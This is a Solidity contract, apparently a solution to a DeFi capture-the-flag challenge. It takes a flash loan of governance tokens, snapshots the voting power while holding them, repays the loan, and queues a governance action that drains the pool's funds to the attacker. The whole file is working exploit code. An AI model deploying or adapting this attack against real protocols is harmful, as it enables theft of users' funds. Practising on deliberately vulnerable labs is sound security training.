// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/interfaces/IERC20.sol";

interface IFlashLoanReceiver {
    function receiveTokens(address,uint256) external;
}

interface ISelfiePool {
    function flashLoan(uint256) external;
    function drainAllFunds(address receiver) external;
}

interface IDVTsnapshot {
    function snapshot() external returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
}

interface IGovernance {
    function queueAction(address receiver, bytes calldata data, uint256 weiAmount) external returns (uint256);
}

contract SelfieAttacker is IFlashLoanReceiver {
    using Address for address payable;

    ISelfiePool private immutable pool;
    IGovernance private immutable govern;
    address private immutable owner;

    constructor(address _pool, address _govern ) payable {
        pool = ISelfiePool(_pool);
        govern = IGovernance(_govern);
        owner = msg.sender;
    }

    function attack(uint256 _amount) external {
        require(msg.sender == owner, "only owner");

        pool.flashLoan(_amount);
        // queue action after snapshot
        bytes memory actionData = abi.encodeWithSelector(pool.drainAllFunds.selector,[owner]);
        govern.queueAction(address(pool), actionData, 0);
    }


    function receiveTokens(address token, uint256 amount) override external {
        require(msg.sender == address(pool), "only pool");

        IDVTsnapshot dvtss = IDVTsnapshot(token);
        // snapshot after borrow from pool
        dvtss.snapshot();
        // pay back token
        bool bRes = dvtss.transfer(msg.sender, amount);
        require(bRes, "pay back token failed");
    }
}
